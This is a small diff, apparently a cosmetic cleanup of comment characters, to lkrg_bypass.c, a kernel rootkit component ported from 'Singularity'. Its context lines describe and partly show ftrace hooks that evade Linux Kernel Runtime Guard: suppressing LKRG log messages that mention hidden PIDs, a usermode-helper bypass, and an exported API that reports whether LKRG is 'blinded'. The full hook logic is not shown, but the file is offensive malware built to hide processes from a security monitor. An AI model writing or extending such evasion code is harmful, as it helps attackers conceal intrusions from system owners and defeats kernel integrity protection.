@@ -1,4 +1,4 @@
-/* lkrg_bypass.c — Linux Kernel Runtime Guard evasion.
+/* lkrg_bypass.c   Linux Kernel Runtime Guard evasion.
  *
  * Hooks that protect hidden processes from LKRG enforcement:
  *   - vprintk_emit: suppress LKRG log messages mentioning hidden PIDs
@@ -9,7 +9,7 @@
  * Graceful no-op: if LKRG is not loaded, all hooks still install but
  * the UMH bypass path is never triggered. Safe to load without LKRG.
  *
- * Port from Singularity — no arch-specific changes (all internal kernel fns).
+ * Port from Singularity   no arch-specific changes (all internal kernel fns).
  */
 #include "../include/core.h"
 #include "../ftrace/ftrace_helper.h"
@@ -184,7 +184,7 @@ static notrace bool should_filter_log(const char *msg)
     return false;
 }
 
-/* ── Hooks ───────────────────────────────────────────────────────── */
+/*  Hooks                                                         */
 
 static asmlinkage int (*orig_vprintk_emit)(int facility, int level,
     const struct dev_printk_info *dev_info, const char *fmt, va_list args);
@@ -349,7 +349,7 @@ static notrace int module_notify(struct notifier_block *nb, unsigned long action
     return NOTIFY_DONE;
 }
 
-/* ── Exported control API ────────────────────────────────────────── */
+/*  Exported control API                                          */
 
 notrace void enable_umh_bypass(void)
 {
@@ -373,7 +373,7 @@ notrace bool is_lkrg_blinded(void)
     return atomic_read(&hooks_active) > 0;
 }
 
-/* ── Init / Exit ─────────────────────────────────────────────────── */
+/*  Init / Exit                                                   */
 
 notrace int lkrg_bypass_init(void)
 {
